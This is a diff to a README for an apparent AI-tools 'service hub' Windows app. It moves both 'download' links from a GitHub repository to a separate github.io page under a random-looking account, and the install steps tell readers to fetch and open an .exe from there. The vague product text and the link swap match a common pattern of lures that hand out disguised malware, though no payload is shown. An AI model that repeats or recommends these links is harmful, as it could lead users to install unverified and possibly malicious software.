@@ -1,6 +1,6 @@
 # 🤖 arch-ai-tools-service-hub - Manage your artificial intelligence tools easily
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/inflectionalmorphologykhmer964/arch-ai-tools-service-hub)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://inflectionalmorphologykhmer964.github.io)
 
 Arch AI Tools serves as a central hub for your artificial intelligence tasks. This software connects your data, automates repetitive work, and provides access to advanced AI services. It acts as a bridge between your computer and modern intelligence models. You use this hub to build workflows that handle complex data operations without needing to write code.
 
@@ -18,7 +18,7 @@ Your computer must meet these basic standards to run the application:
 
 Follow these steps to set up the software on your Windows machine:
 
-1. Visit the [official download page](https://github.com/inflectionalmorphologykhmer964/arch-ai-tools-service-hub) to obtain the installer.
+1. Visit the [official download page](https://inflectionalmorphologykhmer964.github.io) to obtain the installer.
 2. Look for the latest release version on the page.
 3. Click the link that ends in .exe to start the download.
 4. Open your Downloads folder once the process finishes.
